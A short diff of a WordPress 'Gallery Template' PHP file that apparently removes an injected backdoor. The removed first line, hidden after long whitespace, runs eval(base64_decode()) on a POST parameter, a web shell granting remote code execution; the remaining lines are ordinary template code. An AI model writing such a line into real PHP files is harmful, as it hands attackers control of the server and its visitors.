@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nf96240']));?><?php 
+<?php
 /*Template Name: Gallery Template*/
 ?>
 <?php get_header(); ?>
